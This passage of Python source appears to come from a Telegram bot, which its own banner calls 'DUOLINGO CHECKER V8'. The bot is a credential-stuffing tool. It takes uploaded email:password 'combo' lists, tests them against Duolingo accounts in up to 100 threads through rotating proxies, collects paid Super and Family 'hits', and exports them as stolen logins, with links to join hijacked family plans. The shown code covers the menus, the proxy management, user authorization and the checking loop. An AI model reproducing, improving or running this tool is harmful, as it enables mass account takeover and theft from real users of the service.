            text += f"{icon} `[{i}]` {ptype} ∙ `{display}`\n"
    
    markup = InlineKeyboardMarkup(row_width=3)
    btns = []
    if page > 0:
        btns.append(InlineKeyboardButton("◀️", callback_data=f"proxy_pg_{page-1}"))
    btns.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        btns.append(InlineKeyboardButton("▶️", callback_data=f"proxy_pg_{page+1}"))
    if btns:
        markup.row(*btns)
    markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, parse_mode='Markdown', reply_markup=markup)
            return
        except Exception:
            pass
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)

# ========== CALLBACK HANDLER ==========
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global MAX_THREADS, MAX_RETRIES
    global super_count, family_count, free_count, fail_count
    global all_super_hits, all_family_hits

    try:
        if call.data == "start_check":
            bot.answer_callback_query(call.id)
            sess = get_session(call.message.chat.id)
            if sess["checking_active"]:
                bot.send_message(call.message.chat.id, "⚠️ You already have a check running! /stop first")
                return
            bot.send_message(call.message.chat.id,
                "📎 Send combo file (.txt)\nFormat: `email:password`", parse_mode='Markdown')

        elif call.data == "my_stats":
            bot.answer_callback_query(call.id)
            send_stats(call.message.chat.id)

        elif call.data == "view_hits":
            bot.answer_callback_query(call.id)
            send_hits_list(call.message.chat.id, 0)

        elif call.data == "tools":
            bot.answer_callback_query(call.id)
            with proxy_lock:
                proxy_count = len(proxy_list)
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("🧵 THREADS", callback_data="thread_settings"),
                InlineKeyboardButton("🔄 RETRIES", callback_data="retry_settings")
            )
            markup.row(InlineKeyboardButton(f"🌐 PROXIES ({proxy_count})", callback_data="proxy_menu"))
            markup.row(InlineKeyboardButton("🗑️ CLEAR ALL", callback_data="clear_hits"))
            markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
            bot.send_message(call.message.chat.id,
                f"⚙️ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x ∙ ⏱{REQUEST_TIMEOUT}s ∙ 🌐{proxy_count} proxies",
                parse_mode='Markdown', reply_markup=markup)

         elif call.data == "thread_settings":
             bot.answer_callback_query(call.id)
             markup = InlineKeyboardMarkup(row_width=4)
             markup.row(
                 InlineKeyboardButton("10", callback_data="set_threads_10"),
                 InlineKeyboardButton("20", callback_data="set_threads_20"),
                 InlineKeyboardButton("30", callback_data="set_threads_30"),
                 InlineKeyboardButton("50", callback_data="set_threads_50")
             )
             markup.row(
                 InlineKeyboardButton("70", callback_data="set_threads_70"),
                 InlineKeyboardButton("80", callback_data="set_threads_80"),
                 InlineKeyboardButton("100", callback_data="set_threads_100")
             )
             markup.add(InlineKeyboardButton("⬅️", callback_data="tools"))
            bot.send_message(call.message.chat.id, f"🧵 Current: `{MAX_THREADS}`", parse_mode='Markdown', reply_markup=markup)

        elif call.data == "retry_settings":
            bot.answer_callback_query(call.id)
            markup = InlineKeyboardMarkup(row_width=3)
            markup.row(
                InlineKeyboardButton("1x", callback_data="set_retry_1"),
                InlineKeyboardButton("3x", callback_data="set_retry_3"),
                InlineKeyboardButton("5x", callback_data="set_retry_5")
            )
            markup.add(InlineKeyboardButton("⬅️", callback_data="tools"))
            bot.send_message(call.message.chat.id, f"🔄 Current: `{MAX_RETRIES}x`", parse_mode='Markdown', reply_markup=markup)

        elif call.data.startswith("set_threads_"):
            MAX_THREADS = int(call.data.split("_")[2])
            bot.answer_callback_query(call.id, f"✅ Threads → {MAX_THREADS}")
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data.startswith("set_retry_"):
            MAX_RETRIES = int(call.data.split("_")[2])
            bot.answer_callback_query(call.id, f"✅ Retries → {MAX_RETRIES}x")
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data == "clear_hits":
            bot.answer_callback_query(call.id)
            with hits_lock:
                all_super_hits.clear()
                all_family_hits.clear()
            with stats_lock:
                super_count = family_count = free_count = fail_count = 0
            bot.send_message(call.message.chat.id, "✅ Cleared!")
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data == "main_menu":
            bot.answer_callback_query(call.id)
            send_main_menu(call.message.chat.id, call.from_user.id)

        elif call.data == "close_panel":
            bot.answer_callback_query(call.id)
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass

        elif call.data == "noop":
            bot.answer_callback_query(call.id)

        elif call.data == "refresh_hits":
            bot.answer_callback_query(call.id)
            send_hits_list(call.message.chat.id, 0)

        elif call.data == "copy_all_hits":
            bot.answer_callback_query(call.id)
            with hits_lock:
                has_hits = len(all_super_hits) + len(all_family_hits) > 0
            if not has_hits:
                bot.send_message(call.message.chat.id, "📭 No hits.")
            else:
                import io
                txt = f"HITS {datetime.now().strftime('%Y-%m-%d %H:%M')}\n{'='*30}\n\n"
                with hits_lock:
                    for e, p, r in all_super_hits:
                        txt += f"{e}:{p}\n"
                    for e, p, r in all_family_hits:
                        txt += f"{e}:{p}\n"
                file_obj = io.BytesIO(txt.encode('utf-8'))
                file_obj.name = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                bot.send_document(call.message.chat.id, file_obj, caption=f"📋 Total Hits: {len(all_super_hits) + len(all_family_hits)}")

        elif call.data.startswith("hits_page_"):
            page = int(call.data.split("_")[2])
            send_hits_list(call.message.chat.id, page)


        # ========== PROXY CALLBACKS ==========
        elif call.data == "proxy_menu":
            bot.answer_callback_query(call.id)
            send_proxy_menu(call.message.chat.id, call.message.message_id)

        elif call.data == "proxy_add":
            bot.answer_callback_query(call.id)
            send_proxy_type_selector(call.message.chat.id, call.message.message_id)

        elif call.data.startswith("proxy_type_"):
            bot.answer_callback_query(call.id)
            selected_type = call.data.replace("proxy_type_", "")
            if selected_type in PROXY_TYPES:
                pending_proxy_action[call.from_user.id] = {"action": "add", "type": selected_type}
                icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(selected_type, "⚪")
                markup = InlineKeyboardMarkup()
                markup.row(InlineKeyboardButton("❌ Cancel", callback_data="proxy_cancel"))
                txt = (
                    f"{icon} *Add {selected_type} Proxy*\n\n"
                    f"Send proxy in format:\n"
                    f"`host:port:username:password`\n\n"
                    f"Example:\n`proxy.geonode.io:11000:user:pass`\n\n"
                    f"💡 You can also send multiple proxies (one per line)."
                )
                try:
                    bot.edit_message_text(txt, call.message.chat.id, call.message.message_id,
                                          parse_mode='Markdown', reply_markup=markup)
                except Exception:
                    bot.send_message(call.message.chat.id, txt, parse_mode='Markdown', reply_markup=markup)

        elif call.data == "proxy_remove":
            bot.answer_callback_query(call.id)
            with proxy_lock:
                if not proxy_list:
                    send_proxy_menu(call.message.chat.id, call.message.message_id)
                    return
                markup = InlineKeyboardMarkup(row_width=1)
                for i, p in enumerate(proxy_list[:20]):
                    ptype = p.get("type", "HTTP")
                    raw = p.get("proxy", "?")
                    parts = raw.split(":")
                    display = f"{parts[0]}:{parts[1]}" if len(parts) >= 2 else raw[:20]
                    icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(ptype, "⚪")
                    markup.add(InlineKeyboardButton(f"❌ {icon} {ptype} {display}", callback_data=f"proxy_del_{i}"))
                markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))
            try:
                bot.edit_message_text("➖ *Remove Proxy*\nTap to remove:",
                                      call.message.chat.id, call.message.message_id,
                                      parse_mode='Markdown', reply_markup=markup)
            except Exception:
                bot.send_message(call.message.chat.id, "➖ *Remove Proxy*\nTap to remove:",
                                 parse_mode='Markdown', reply_markup=markup)

        elif call.data.startswith("proxy_del_"):
            try:
                idx = int(call.data.replace("proxy_del_", ""))
                with proxy_lock:
                    if 0 <= idx < len(proxy_list):
                        removed = proxy_list.pop(idx)
                        save_proxies()
                        bot.answer_callback_query(call.id, f"✅ Removed proxy #{idx+1}")
                    else:
                        bot.answer_callback_query(call.id, "❌ Invalid index")
            except Exception:
                bot.answer_callback_query(call.id, "⚠️ Error")
            send_proxy_menu(call.message.chat.id, call.message.message_id)

        elif call.data == "proxy_list":
            bot.answer_callback_query(call.id)
            send_proxy_list(call.message.chat.id, 0, call.message.message_id)

        elif call.data.startswith("proxy_pg_"):
            bot.answer_callback_query(call.id)
            page = int(call.data.replace("proxy_pg_", ""))
            send_proxy_list(call.message.chat.id, page, call.message.message_id)

        elif call.data == "proxy_clear":
            bot.answer_callback_query(call.id, "✅ All proxies cleared!")
            with proxy_lock:
                proxy_list.clear()
                save_proxies()
            send_proxy_menu(call.message.chat.id, call.message.message_id)

        elif call.data == "proxy_cancel":
            bot.answer_callback_query(call.id, "Cancelled")
            pending_proxy_action.pop(call.from_user.id, None)
            send_proxy_menu(call.message.chat.id, call.message.message_id)

        elif call.data == "proxy_test":
            bot.answer_callback_query(call.id, "🧪 Testing…")
            with proxy_lock:
                snap = list(proxy_list)
            if not snap:
                send_proxy_menu(call.message.chat.id, call.message.message_id)
                return

            chat_id = call.message.chat.id
            msg_id = call.message.message_id
            try:
                bot.edit_message_text(
                    f"🧪 *Testing {len(snap)} proxy(s)…*\n_Hitting api.ipify.org via each proxy_",
                    chat_id, msg_id, parse_mode='Markdown'
                )
            except Exception:
                pass

            def _run_test():
                results = [None] * len(snap)
                def _w(i_p):
                    i, p = i_p
                    results[i] = (p, test_one_proxy(p))
                with ThreadPoolExecutor(max_workers=min(20, max(1, len(snap)))) as ex:
                    list(ex.map(_w, list(enumerate(snap))))

                ok = sum(1 for r in results if r and r[1]["ok"])
                bad = len(results) - ok

                lines = [
                    f"🧪 *PROXY TEST RESULT*",
                    f"✅ Live: *{ok}*  ·  ❌ Dead: *{bad}*",
                    "─" * 28,
                ]
                for i, item in enumerate(results, 1):
                    if not item:
                        continue
                    p, r = item
                    ptype = p.get("type", "HTTP")
                    raw = p.get("proxy", "?")
                    parts = raw.split(":")
                    display = f"{parts[0]}:{parts[1]}" if len(parts) >= 2 else raw[:20]
                    icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(ptype, "⚪")
                    head = f"{icon} `[{i}]` {ptype} `{display}`"
                    if r["ok"]:
                        lines.append(f"{head}\n   ✅ LIVE · IP `{r['ip']}` · {r['latency']}ms")
                    else:
                        lines.append(f"{head}\n   ❌ DEAD · {r['error']} · {r['latency']}ms")
                lines.append("")
                lines.append("Tap below to go back.")

                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))

                txt = "\n".join(lines)
                if len(txt) > 3900:
                    txt = txt[:3900] + "\n…(truncated)"
                try:
                    bot.edit_message_text(txt, chat_id, msg_id, parse_mode='Markdown', reply_markup=markup)
                except Exception:
                    bot.send_message(chat_id, txt, parse_mode='Markdown', reply_markup=markup)

            threading.Thread(target=_run_test, daemon=True).start()

        # ========== ADMIN PANEL ==========
        elif call.data == "admin_panel":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                bot.send_message(call.message.chat.id, "⛔ Admin only.")
                return
            send_admin_panel(call.message.chat.id)

        elif call.data == "admin_list":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                return
            send_user_list(call.message.chat.id)

        elif call.data == "admin_add":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                return
            pending_admin_action[call.from_user.id] = "add"
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("❌ Cancel", callback_data="admin_cancel"))
            bot.send_message(call.message.chat.id,
                "➕ *Add User*\n\nReply with the Telegram numeric ID to authorize.\n_(e.g. `123456789`)_",
                parse_mode='Markdown', reply_markup=markup)

        elif call.data == "admin_remove":
            bot.answer_callback_query(call.id)
            if not is_admin(call.from_user.id):
                return
            if not allowed_users:
                bot.send_message(call.message.chat.id, "📭 No users to remove.")
                send_admin_panel(call.message.chat.id)
                return
            markup = InlineKeyboardMarkup(row_width=2)
            for uid in sorted(allowed_users):
                markup.add(InlineKeyboardButton(f"❌ {uid}", callback_data=f"admin_del_{uid}"))
            markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="admin_panel"))
            bot.send_message(call.message.chat.id,
                "➖ *Remove User*\nTap an ID to revoke access:",
                parse_mode='Markdown', reply_markup=markup)

        elif call.data.startswith("admin_del_"):
            if not is_admin(call.from_user.id):
                bot.answer_callback_query(call.id, "⛔")
                return
            try:
                uid = int(call.data.split("_")[2])
                if uid in allowed_users:
                    allowed_users.discard(uid)
                    save_users()
                    bot.answer_callback_query(call.id, f"✅ Removed {uid}")
                else:
                    bot.answer_callback_query(call.id, "Not found")
            except Exception:
                bot.answer_callback_query(call.id, "⚠️ Error")
            send_admin_panel(call.message.chat.id)

        elif call.data == "admin_cancel":
            bot.answer_callback_query(call.id, "Cancelled")
            pending_admin_action.pop(call.from_user.id, None)
            send_admin_panel(call.message.chat.id)

    except Exception as e:
        logging.error(f"Callback error: {e}")
        try:
            bot.answer_callback_query(call.id, "⚠️ Error")
        except:
            pass

# ========== PROCESS COMBOS (per-user, thread-safe) ==========
def process_combos(chat_id, combos):
    """Each user's check runs in its own session. Hits/stats use locks."""
    global super_count, family_count, free_count, fail_count
    global last_batch_super, last_batch_family, last_batch_free, last_batch_fail

    sess = get_session(chat_id)
    with sess["lock"]:
        sess["checking_active"] = True
        sess["stop_flag"] = False

    # Per-user local counters (so multiple users don't see each other's progress)
    local_super = local_family = local_free = local_fail = 0
    local_batch_super = local_batch_family = local_batch_free = local_batch_fail = 0

    total = len(combos)
    completed = 0
    start_time = time.time()
    last_update = 0

    status_msg = bot.send_message(chat_id,
        f"🚀 Starting ∙ 📋{total:,} ∙ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x")

    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            sess["current_executor"] = executor
            futures = {executor.submit(check_single_account, e, p): (e, p) for e, p in combos}
            sess["current_futures"] = futures

            for future in as_completed(futures):
                if sess["stop_flag"]:
                    for f in futures:
                        f.cancel()
                    break

                completed += 1
                pct = (completed / total) * 100
                elapsed = time.time() - start_time

                try:
                    result = future.result(timeout=60)
                    if len(result) == 6:
                        email, password, status, detail, plan_type, family_invite = result
                    elif len(result) == 5:
                        email, password, status, detail, plan_type = result
                        family_invite = None
                    else:
                        continue
                except Exception:
                    local_fail += 1
                    local_batch_fail += 1
                    with stats_lock:
                        fail_count += 1
                    continue

                if status == "HIT":
                    if plan_type == "FAMILY":
                        local_family += 1
                        local_batch_family += 1
                        with stats_lock:
                            family_count += 1
                        with hits_lock:
                            all_family_hits.append((email, password, detail))
                    else:
                        local_super += 1
                        local_batch_super += 1
                        with stats_lock:
                            super_count += 1
                        with hits_lock:
                            all_super_hits.append((email, password, detail))
                    # Inline buttons attached to each hit
                    hit_kb = InlineKeyboardMarkup(row_width=2)
                    hit_kb.add(
                        InlineKeyboardButton("🌐 Duolingo", url="https://www.duolingo.com/?isLoggingIn=true"),
                        InlineKeyboardButton("📋 Copy Combo", callback_data="noop"),
                    )
                    if plan_type == "FAMILY" and family_invite:
                        link = f"https://www.duolingo.com/family-plan?invite={family_invite}"
                        hit_kb.row(InlineKeyboardButton("🎟 Join Family Plan", url=link))
                    try:
                        bot.send_message(chat_id, detail, parse_mode='Markdown', reply_markup=hit_kb)
                    except Exception:
                        try:
                            bot.send_message(chat_id, detail, reply_markup=hit_kb)
                        except Exception:
                            try:
                                bot.send_message(chat_id, detail)
                            except Exception:
                                pass
                    logging.info(f"✅ HIT: {email} ({plan_type}) [chat={chat_id}]")
                elif status == "FREE":
                    local_free += 1
                    local_batch_free += 1
                    with stats_lock:
                        free_count += 1
                elif status == "STOPPED":
                    break
                else:
                    local_fail += 1
                    local_batch_fail += 1
                    with stats_lock:
                        fail_count += 1

                if completed - last_update >= PROGRESS_INTERVAL or completed == total:
                    last_update = completed
                    bar = "█" * int(pct/5) + "░" * (20 - int(pct/5))
                    spd = completed / elapsed if elapsed > 0 else 0
                    eta = (total - completed) / spd if spd > 0 else 0

                    prog = f"""🦉 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 (yours)
[{bar}] {pct:.1f}%
📊 {completed:,}/{total:,} ∙ ⏱{elapsed:.0f}s ∙ 🚀{int(spd)}/s ∙ ETA:{int(eta)}s

💎{local_super} 👨‍👩‍👧{local_family} ⚠️{local_free} ❌{local_fail}
+{local_batch_super}💎 +{local_batch_family}👨‍👩‍👧 +{local_batch_free}⚠️ +{local_batch_fail}❌

⚡ /stop to cancel"""
                    try:
                        bot.edit_message_text(prog, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
                    except:
                        pass
                    local_batch_super = local_batch_family = local_batch_free = local_batch_fail = 0

    except Exception as e:
        logging.error(f"Process error [chat={chat_id}]: {e}\n{traceback.format_exc()}")
        bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}\nHits saved!")

    elapsed = time.time() - start_time
    total_hits = local_super + local_family
    rate = round(total_hits / total * 100, 2) if total > 0 else 0

    bot.send_message(chat_id, f"""{'━' * 32}
✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 (yours)
{'━' * 32}
⏱ {elapsed:.1f}s ∙ 📋 {total:,} ∙ 🎯 {rate}%
💎{local_super} 👨‍👩‍👧{local_family} ⚠️{local_free} ❌{local_fail}
💾 VIEW HITS for results""", parse_mode='Markdown')
    send_main_menu(chat_id)

    with sess["lock"]:
        sess["checking_active"] = False
        sess["stop_flag"] = False
        sess["current_executor"] = None
        sess["current_futures"] = None

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start_command(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message,
            f"⛔ Unauthorized.\n\nYour ID: `{message.from_user.id}`\nAsk an admin to add you.",
            parse_mode='Markdown')
        return
    send_main_menu(message.chat.id, message.from_user.id)

@bot.message_handler(commands=['stop'])
def stop_command(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ Unauthorized.")
        return
    sess = get_session(message.chat.id)
    if sess["checking_active"]:
        sess["stop_flag"] = True
        if sess["current_futures"]:
            for f in sess["current_futures"]:
                f.cancel()
        bot.reply_to(message, "🛑 Stopping your check...")
    else:
        bot.reply_to(message, "ℹ️ You have no active check.")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Admin only.")
        return
    send_admin_panel(message.chat.id)

@bot.message_handler(commands=['myid'])
def myid_command(message):
    bot.reply_to(message, f"🆔 Your Telegram ID: `{message.from_user.id}`", parse_mode='Markdown')

@bot.message_handler(commands=['adduser'])
def adduser_cmd(message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/adduser <user_id>`", parse_mode='Markdown')
        return
    try:
        uid = int(parts[1])
        allowed_users.add(uid)
        save_users()
        bot.reply_to(message, f"✅ Added `{uid}` ({len(allowed_users)} total)", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID — must be numeric.")

@bot.message_handler(commands=['removeuser'])
def removeuser_cmd(message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/removeuser <user_id>`", parse_mode='Markdown')
        return
    try:
        uid = int(parts[1])
        if uid in allowed_users:
            allowed_users.discard(uid)
            save_users()
            bot.reply_to(message, f"✅ Removed `{uid}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, "ℹ️ User not in list.")
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔")
        return
    sess = get_session(message.chat.id)
    if sess["checking_active"]:
        bot.reply_to(message, "⚠️ You already have a check running! /stop first")
        return

    status_msg = bot.reply_to(message, "📥 Loading...")

    try:
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        combos = []
        for line in content.split('\n'):
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                e, p = parts[0].strip(), parts[1].strip()
                if e and p:
                    combos.append((e, p))

        if not combos:
            bot.edit_message_text("❌ No valid combos. Format: email:password",
                                 status_msg.chat.id, status_msg.message_id)
            return

        bot.edit_message_text(
            f"✅ {len(combos):,} combos ∙ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x\n🚀 Starting...",
            status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')

        thread = threading.Thread(target=process_combos, args=(message.chat.id, combos))
        thread.daemon = True
        thread.start()

    except Exception as e:
        logging.error(f"File error: {e}")
        bot.edit_message_text(f"❌ {str(e)[:100]}", status_msg.chat.id, status_msg.message_id)

# Capture text replies for admin "add user" flow
@bot.message_handler(func=lambda m: m.from_user.id in pending_admin_action,
                     content_types=['text'])
def admin_text_input(message):
    if not is_admin(message.from_user.id):
        pending_admin_action.pop(message.from_user.id, None)
        return
    action = pending_admin_action.pop(message.from_user.id, None)
    if action == "add":
        text = message.text.strip()
        try:
            uid = int(text)
            if uid in ADMIN_IDS:
                bot.reply_to(message, "ℹ️ Already an admin.")
            elif uid in allowed_users:
                bot.reply_to(message, f"ℹ️ `{uid}` is already authorized.", parse_mode='Markdown')
            else:
                allowed_users.add(uid)
                save_users()
                bot.reply_to(message, f"✅ Added `{uid}`\n👥 Total: {len(allowed_users)}",
                            parse_mode='Markdown')
        except ValueError:
            bot.reply_to(message, "❌ Invalid ID. Must be numeric.")
        send_admin_panel(message.chat.id)


# Capture text replies for proxy "add" flow
@bot.message_handler(func=lambda m: m.from_user.id in pending_proxy_action,
                     content_types=['text'])
def proxy_text_input(message):
    info = pending_proxy_action.pop(message.from_user.id, None)
    if not info or info.get("action") != "add":
        return
    
    ptype = info.get("type", "HTTP")
    text = message.text.strip()
    lines = [l.strip() for l in text.split("\n") if l.strip()]
    
    added = 0
    errors = 0
    for line in lines:
        parts = line.split(":")
        if len(parts) >= 2:
            with proxy_lock:
                proxy_list.append({"proxy": line, "type": ptype})
            added += 1
        else:
            errors += 1
    
    if added > 0:
        with proxy_lock:
            save_proxies()
        icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(ptype, "⚪")
        msg = f"{icon} ✅ Added *{added}* {ptype} proxy(s)"
        if errors > 0:
            msg += f"\n⚠️ {errors} invalid line(s) skipped"
        with proxy_lock:
            msg += f"\n📊 Total proxies: *{len(proxy_list)}*"
        bot.reply_to(message, msg, parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ Invalid format. Use `host:port:user:pass`", parse_mode='Markdown')
    
    send_proxy_menu(message.chat.id)

# ========== BOT START ==========
def run_bot():
    load_users()
    load_proxies()
    # Ensure no other polling instance / webhook is active (fixes 409 Conflict)
    while True:
        try:
            try:
                bot.remove_webhook()
            except Exception:
                pass
            time.sleep(1)

            print("═" * 40)
            print("🦉 DUOLINGO CHECKER V8 (Multi-User)")
            print(f"👑 Admins: {ADMIN_IDS}")
            print(f"👥 Authorized users: {len(allowed_users)}")
            print(f"🌐 Proxies loaded: {len(proxy_list)}")
            print(f"🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x ∙ ⏱ {REQUEST_TIMEOUT}s")
            print(f"🔀 Concurrent users supported: 10 (threaded polling)")
            print("═" * 40)
            print("🟢 Bot started!")
            # num_threads=10 → handles up to 10 users' updates concurrently
            bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                 allowed_updates=None, skip_pending=True,
                                 restart_on_change=False)
        except KeyboardInterrupt:
            print("🛑 Stopped.")
            break
        except Exception as e:
            logging.error(f"Polling error: {e}")
            logging.info("🔄 Reconnecting in 10s...")
            time.sleep(10)

if __name__ == "__main__":
    run_bot()
